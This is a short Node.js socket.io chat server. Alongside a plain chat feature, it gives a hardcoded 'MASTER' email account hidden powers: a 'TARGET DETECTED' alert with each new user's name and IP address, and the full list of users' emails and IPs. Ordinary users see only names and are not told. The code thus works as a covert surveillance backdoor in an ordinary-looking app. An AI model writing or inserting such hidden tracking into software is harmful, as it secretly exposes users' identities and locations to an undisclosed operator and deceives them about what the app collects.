const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
app.set('trust proxy', true);
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

app.use(express.static(__dirname));

let users = [];
const MASTER = "toucheur2pp@heaven.com";

io.on('connection', (socket) => {
    let ip = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
    if (ip && ip.includes(',')) ip = ip.split(',')[0];
    ip = ip ? ip.replace('::ffff:', '').trim() : "0.0.0.0";

    socket.on('init', (data) => {
        const u = { id: socket.id, n: data.n, e: data.e, ip: ip };
        users.push(u);

        const boss = users.find(user => user.e === MASTER);
        if (boss && u.e !== MASTER) {
            io.to(boss.id).emit('notification', { title: "TARGET DETECTED", msg: `${u.n} connected from ${u.ip}`, ip: u.ip });
        }
        updateAll();
    });

    socket.on('chat', (data) => {
        const sender = users.find(u => u.id === socket.id);
        if (sender) io.emit('chat', { n: sender.n, t: data.t, color: sender.e === MASTER ? '#f0f' : '#0f0' });
    });

    socket.on('disconnect', () => {
        users = users.filter(u => u.id !== socket.id);
        updateAll();
    });

    function updateAll() {
        const boss = users.find(u => u.e === MASTER);
        users.forEach(user => {
            if (user.e === MASTER) io.to(user.id).emit('sync', users);
            else io.to(user.id).emit('sync', users.map(u => ({ n: u.n })));
        });
    }
});

server.listen(process.env.PORT || 3000, '0.0.0.0');
